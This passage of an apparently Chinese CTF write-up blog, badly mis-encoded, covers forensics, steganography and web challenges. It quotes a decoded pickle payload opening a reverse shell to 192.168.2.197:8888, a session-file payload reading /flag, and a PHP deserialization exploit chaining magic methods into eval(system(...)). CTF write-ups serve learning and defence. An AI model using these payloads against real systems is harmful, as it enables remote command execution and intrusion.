å¾—åˆ°..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;sess_car&amp;content&#x3D;func|N;files|a:2:&#123;s:8:&quot;filename&quot;;s:16:&quot;.&#x2F;files&#x2F;filename&quot;;s:20:&quot;call_user_func_array&quot;;s:28:&quot;.&#x2F;files&#x2F;call_user_func_array&quot;;&#125;paths|a:1:&#123;s:5:&quot;&#x2F;flag&quot;;s:13:&quot;SplFileObject&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°ä½¿ç”¨çš„æ˜¯SplFileObjectç±»è¯»å–çš„flag</p><h1 id="é™‡å‰‘æ¯-2021-ç®€å•æ—¥å¿—åˆ†æ"><a href="#é™‡å‰‘æ¯-2021-ç®€å•æ—¥å¿—åˆ†æ" class="headerlink" title="[é™‡å‰‘æ¯ 2021]ç®€å•æ—¥å¿—åˆ†æ"></a>[é™‡å‰‘æ¯ 2021]ç®€å•æ—¥å¿—åˆ†æ</h1><h2 id="é—®1-6"><a href="#é—®1-6" class="headerlink" title="é—®1"></a>é—®1</h2><p>ç®€å•åˆ†æå¯çŸ¥å‚æ•°ä¸º<code>user</code></p><h2 id="é—®2-6"><a href="#é—®2-6" class="headerlink" title="é—®2"></a>é—®2</h2><pre class="line-numbers language-none"><code class="language-none">127.0.0.1 - - [07&#x2F;Aug&#x2F;2021 10:43:12] &quot;GET &#x2F;?user&#x3D;STAKcDAKMFMnY2F0IC9UaDRzX0lTX1ZFUllfSW1wb3J0X0ZpMWUnCnAxCjAoZzAKbHAyCjAoSTAKdHAzCjAoZzMKSTAKZHA0CjBjb3MKc3lzdGVtCnA1CjBnNQooZzEKdFIu HTTP&#x2F;1.1&quot; 500 -è§£å¯†å¾—åˆ°I0p00S&#39;cat &#x2F;Th4s_IS_VERY_Import_Fi1e&#39;p10(g0lp20(I0tp30(g3I0dp40cossystemp50g5(g1tR.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥é»‘å®¢æŸ¥çœ‹ç§˜å¯†æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ä¸º<code>/Th4s_IS_VERY_Import_Fi1e</code></p><h2 id="é—®3-5"><a href="#é—®3-5" class="headerlink" title="é—®3"></a>é—®3</h2><pre class="line-numbers language-none"><code class="language-none">127.0.0.1 - - [07&#x2F;Aug&#x2F;2021 10:43:12] &quot;GET &#x2F;?user&#x3D;STAKcDAKMFMnYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjIuMTk3Lzg4ODggMD4mMScKcDEKMChnMApscDIKMChJMAp0cDMKMChnMwpJMApkcDQKMGNvcwpzeXN0ZW0KcDUKMGc1CihnMQp0Ui4&#x3D; HTTP&#x2F;1.1&quot; 500 -è§£ç å¾—åˆ°I0p00S&#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.2.197&#x2F;8888 0&gt;&amp;1&#39;p10(g0lp20(I0tp30(g3I0dp40cossystemp50g5(g1tR.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥é»‘å®¢åå¼¹shellçš„ipå’Œç«¯å£ä¸º192.168.2.197:8888</p><h1 id="é¹åŸæ¯-2022-ç®€å•å–è¯"><a href="#é¹åŸæ¯-2022-ç®€å•å–è¯" class="headerlink" title="[é¹åŸæ¯ 2022]ç®€å•å–è¯"></a>[é¹åŸæ¯ 2022]ç®€å•å–è¯</h1><pre class="line-numbers language-none"><code class="language-none">.&#x2F;volatility -f file.raw imageinfo <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309251411174.png" alt="image-20230925141104103"></p><p>çœ‹ä¸€ä¸‹cmdå†å²å‘½ä»¤</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;volatility -f file.raw --profile&#x3D;WinXPSP2x86 cmdscan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309251420640.png" alt="image-20230925142054617"></p><p>çœ‹åˆ°äº†ä¸€ä¸ªå¯†ç ï¼Œå†…å®¹æ˜¯<code>62b041223bb9a</code>ï¼Œåº”è¯¥åœ¨åé¢æœ‰ç”¨</p><p>å†çœ‹ä¸€ä¸‹æµè§ˆå™¨è®¿é—®è®°å½•</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;volatility -f file.raw --profile&#x3D;WinXPSP2x86 iehistory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309251411609.png" alt="image-20230925141152586"></p><p>å‘ç°äº†ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶ï¼Œä¿å­˜ä¸‹æ¥</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;volatility -f file.raw --profile&#x3D;WinXPSP2x86 filescan | grep secret.jpg.&#x2F;volatility -f file.raw --profile&#x3D;WinXPSP2x86 dumpfiles -Q 0x0000000002325028 -D .&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309251413006.png" alt="image-20230925141315977"></p><p>æŸ¥çœ‹æ–‡ä»¶ï¼Œå¯¹æ–‡ä»¶base64è§£ç ï¼Œ010æŸ¥çœ‹å‘ç°æ–‡ä»¶å€’è¿‡æ¥äº†ï¼Œæ ¹æ®æ–‡ä»¶å¤´ç‰¹å¾åˆ¤æ–­æ˜¯zipæ–‡ä»¶</p><p>å»ºè®®ç”¨base64è§£ç å’Œå†™å…¥å…¨ç¨‹ä½¿ç”¨python</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'res/file.None.0x81fc6610.dat'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'res/1.zip'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰“å¼€<code>1.zip</code>ï¼Œéœ€è¦å¯†ç æ‰èƒ½è§£å‹ï¼Œç”¨å‰é¢å‘ç°çš„å¯†ç è§£å¼€</p><p>å‹ç¼©åŒ…é‡Œçš„<code>flag.txt</code>ï¼Œæœ‰å¤§é‡æ•°å­—ç»„åˆï¼Œå…¶ä¸­æ¯ç»„ç¬¬äºŒä¸ªæ•°å­—åˆ°<code>349</code>å°±ä¼šé‡æ–°è®¡æ•°ï¼Œæœ€åä¸€ä¸ªç»„åˆæ˜¯<code>349 349</code>ï¼ŒçŒœæµ‹æ˜¯åæ ‡ç”»å›¾</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imageim <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">350</span><span class="token punctuation">,</span> <span class="token number">350</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"res/flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    r <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>lst <span class="token operator">=</span> r<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>lst<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> lst<span class="token punctuation">:</span>    x <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    y <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    im<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>im<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"res/flag.png"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”»å‡ºæ¥æ˜¯ä¸€ä¸ªäºŒç»´ç ï¼Œæ‰«æäºŒç»´ç å³å¯å¾—åˆ°flag</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;a6b93e36-f097-11ec-a9b2-5254002d2b31&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="é¹¤åŸæ¯-2021-Misc2"><a href="#é¹¤åŸæ¯-2021-Misc2" class="headerlink" title="[é¹¤åŸæ¯ 2021]Misc2"></a>[é¹¤åŸæ¯ 2021]Misc2</h1><p>å…ˆæ‹‰åˆ°010æŸ¥çœ‹ï¼Œæ²¡æœ‰å‘ç°</p><p>å†æ‹‰åˆ°kali binwalkåˆ†ç¦»ï¼Œæ²¡æœ‰éšè—æ–‡ä»¶</p><p>zstegçœ‹çœ‹</p><p><img src="https://imag.keyblue.cn/imag/202309051359150.png" alt="image-20230905135915097"></p><p>å‘ç°äº†Unicodeç¼–ç ï¼Œæ‹‰å‡ºæ¥è§£ç </p><p><img src="https://imag.keyblue.cn/imag/202309051400423.png" alt="image-20230905140039392"></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;h0w_4bouT_enc0de_4nd_pnG&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="é¹¤åŸæ¯-2021-New-MISC"><a href="#é¹¤åŸæ¯-2021-New-MISC" class="headerlink" title="[é¹¤åŸæ¯ 2021]New MISC"></a>[é¹¤åŸæ¯ 2021]New MISC</h1><p>é¢˜ç›®ç»™çš„æ˜¯ä¸€ä¸ªpdfæ–‡ä»¶</p><p><img src="https://imag.keyblue.cn/imag/202308291322049.png" alt="image-20230829132242964"></p><p>010æ‰“å¼€çœ‹ä¸å‡ºæ¥ä»€ä¹ˆä¸œè¥¿</p><p>åº”è¯¥æ˜¯ä¸€ä¸ªéšå†™</p><p>wbstego4openä¸‹è½½ ï¼š<a href="http://wbstego.wbailer.com/">http://wbstego.wbailer.com/</a></p><p>ç”¨wbstego4openæ¥æŸ¥çœ‹éšå†™å†…å®¹</p><p>æ‰“å¼€è½¯ä»¶é€‰æ‹©Decode</p><p><img src="https://imag.keyblue.cn/imag/202308291729242.png" alt="image-20230829172914185"></p><p>é€‰æ‹©PDFæŠŠéœ€è¦æŸ¥çœ‹çš„æ–‡ä»¶é€‰ä¸Š</p><p><img src="https://imag.keyblue.cn/imag/202308291730071.png" alt="image-20230829173010034"></p><p>è¿™é‡Œç©ºç€</p><p><img src="https://imag.keyblue.cn/imag/202308291730875.png" alt="image-20230829173022840"></p><p>é€‰æ‹©ä¿å­˜åˆ°å“ªé‡Œï¼Œè¿™é‡Œé€‰æ‹©ä¿å­˜åˆ°1.txt</p><p><img src="https://imag.keyblue.cn/imag/202308291730725.png" alt="image-20230829173049688"></p><p>å®Œæˆ</p><p><img src="https://imag.keyblue.cn/imag/202308291731142.png" alt="image-20230829173114105"></p><p>æ‰“å¼€1.txt</p><p><img src="https://imag.keyblue.cn/imag/202308291732803.png" alt="image-20230829173249779"></p><p>flagå€¼ï¼šflag{verY_g00d_YoU_f0und_th1s}</p><h1 id="é¹¤åŸæ¯-2021-æµé‡åˆ†æ"><a href="#é¹¤åŸæ¯-2021-æµé‡åˆ†æ" class="headerlink" title="[é¹¤åŸæ¯ 2021]æµé‡åˆ†æ"></a>[é¹¤åŸæ¯ 2021]æµé‡åˆ†æ</h1><p>é¢˜ç›®æ‰“å¼€ï¼Œæ˜¯ä¸ªpacpngåŒ…</p><p><img src="https://imag.keyblue.cn/imag/202308281806840.png" alt="image-20230828180613752"></p><p>æ˜æ˜¾çš„sqlæ³¨å…¥æµé‡</p><p>ç­›é€‰æµé‡</p><p><img src="https://imag.keyblue.cn/imag/202308281821128.png" alt="image-20230828182101087"></p><p>é€‰æ‹©å¯¼å‡ºä¸ºçº¯æ–‡æœ¬</p><p><img src="https://imag.keyblue.cn/imag/202308281825573.png" alt="image-20230828182552538"></p><p>å–æ¶ˆå‹¾é€‰Packet detailsåå¯¼å‡º</p><p><img src="https://imag.keyblue.cn/imag/202308281936860.png" alt="image-20230828193622826"></p><p>å¯¼å‡ºåçš„æ–‡ä»¶</p><p><img src="https://imag.keyblue.cn/imag/202308281937902.png" alt="image-20230828193727851"></p><p>è„šæœ¬</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> reflag <span class="token operator">=</span> <span class="token string">''</span>var_back <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'res/timu.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>        <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'(text/html)'</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[%20and%20ascii(substr((select%20flag%20from%20t),]"</span></span><span class="token punctuation">,</span> line<span class="token punctuation">)</span><span class="token punctuation">:</span>            var <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[,1))]=(.*?)--+"</span></span><span class="token punctuation">,</span> line<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> var <span class="token operator">&lt;=</span> var_back<span class="token punctuation">:</span>                flag <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>var_back<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            var_back <span class="token operator">=</span> var<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202308282038873.png?x-image-process=style/style-d277" alt="image-20230828203829847"></p><h1 id="HDCTF-2023-MasterMisc"><a href="#HDCTF-2023-MasterMisc" class="headerlink" title="[HDCTF 2023]MasterMisc"></a>[HDCTF 2023]MasterMisc</h1><ul><li><p>æŠŠå‹ç¼©åŒ…ä½¿ç”¨ARCHPRçˆ†ç ´ï¼Œå¾—åˆ°å¯†ç ï¼Œè§£å¼€åæ˜¯ä¸€ä¸ªå›¾ç‰‡</p></li><li><p>æŠŠå›¾ç‰‡æ‰”åˆ°foremoståˆ†è§£ï¼Œå¾—åˆ°å¦ä¸€ä¸ªå›¾å’Œä¸€ä¸ªwavæ–‡ä»¶</p></li></ul><p>å…ˆçœ‹å›¾ç‰‡ï¼Œæ ¹æ®å›¾ç‰‡ä¸Šçš„æç¤ºæ–‡å­—ï¼Œæ¨æ–­éœ€è¦ä¿®æ”¹é«˜åº¦ï¼Œ010ä¿®æ”¹é«˜åº¦å¾—åˆ°ä¸­é—´ä¸€æ®µflag</p><p><img src="https://imag.keyblue.cn/imag/202310101032597.png" alt="image-20231010103259560"></p><p>å†çœ‹éŸ³é¢‘æ–‡ä»¶ï¼ŒaudacityæŸ¥çœ‹é¢‘è°±å›¾å‘ç°å‰æ®µflag</p><p><img src="https://imag.keyblue.cn/imag/202310101030653.png?x-image-process=style/style-d277" alt="image-20231010103027481"></p><p>è‡³æ­¤ï¼Œåªå‰©ä¸‹åŸå›¾æ²¡æœ‰æ‰¾åˆ°flagï¼Œ</p><ul><li>å›åˆ°åŸå›¾ï¼Œåœ¨å›¾äºŒå’ŒéŸ³é¢‘æ–‡ä»¶ä¸­æ‰¾åˆ°åæ®µflag</li></ul><p><img src="https://imag.keyblue.cn/imag/202310101038193.png" alt="image-20231010103817160"></p><pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;e67d8104-7536-4433-bfff-96759901c405&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Misc </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF Webæ¨¡å—åšé¢˜è®°å½•</title>
      <link href="/2023/08/27/NSSCTF%20Web%E6%A8%A1%E5%9D%97%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/08/27/NSSCTF%20Web%E6%A8%A1%E5%9D%97%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="NISACTF-2022-babyserialize"><a href="#NISACTF-2022-babyserialize" class="headerlink" title="[NISACTF 2022]babyserialize"></a>[NISACTF 2022]babyserialize</h1><p>å…ˆçœ‹æºç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"waf.php"</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">NISA</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$fun</span><span class="token operator">=</span><span class="token string double-quoted-string">"show_me_flag"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$txw4ever</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">fun</span><span class="token operator">==</span><span class="token string double-quoted-string">"show_me_flag"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">hint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$from</span><span class="token punctuation">,</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">fun</span><span class="token operator">=</span><span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">fun</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">" "</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">checkcheck</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">txw4ever</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">txw4ever</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">TianXiWei</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$x</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">ext</span><span class="token operator">-></span><span class="token function">nisa</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">x</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Ilovetxw</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$huang</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$su</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$fun1</span><span class="token punctuation">,</span><span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">huang</span><span class="token operator">-></span><span class="token property">fun</span><span class="token operator">=</span><span class="token variable">$arg</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$bb</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">su</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$bb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">four</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">"TXW4EVER"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$fun</span><span class="token operator">=</span><span class="token string single-quoted-string">'abc'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$value</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">fun</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"sixsixsix"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ser'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ser'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//func checkcheck($data)&#123;</span><span class="token comment">//  if(preg_match(......))&#123;</span><span class="token comment">//      die(something wrong);</span><span class="token comment">//  &#125;</span><span class="token comment">//&#125;</span><span class="token comment">//function hint()&#123;</span><span class="token comment">//    echo ".......";</span><span class="token comment">//    die();</span><span class="token comment">//&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€ç»ˆçš„ç›®çš„æ˜¯è§¦å‘<code>NISA::__invoke</code>é­”æœ¯æ–¹æ³•</p><blockquote><p>__invokeçš„è§£é‡Šæ˜¯ï¼šç›´æ¥è°ƒç”¨å¯¹è±¡åå½“æ–¹æ³•ä½¿ç”¨æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨</p></blockquote><p>å¯ä»¥é€šè¿‡<code>Ilovetxw::__toString</code>æ¥è§¦å‘<code>NISA::__invoke</code></p><blockquote><p>__tostringçš„è§£é‡Šæ˜¯ï¼šå°†å½“å‰ç±»çš„ç±»åå½“ä½œå˜é‡æ—¶è‡ªåŠ¨è°ƒç”¨</p></blockquote><p>æ­£å¸¸æ¥è®²ï¼Œéœ€è¦åµŒå¥—æé•¿çš„é“¾æ¥å‡ºå‘ï¼Œä½†<code>NISA::__wakeup</code>ä¸­çš„å¼±æ¯”è¾ƒä¹Ÿå¯ä»¥è§¦å‘<code>Ilovetxw::__toString</code>ï¼Œæ‰€ä»¥æœ‰ä»¥ä¸‹exp</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">NISA</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$txw4ever</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system("ls /");'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Ilovetxw</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NISA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">fun</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Ilovetxw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">fun</span><span class="token operator">-></span><span class="token property">su</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span 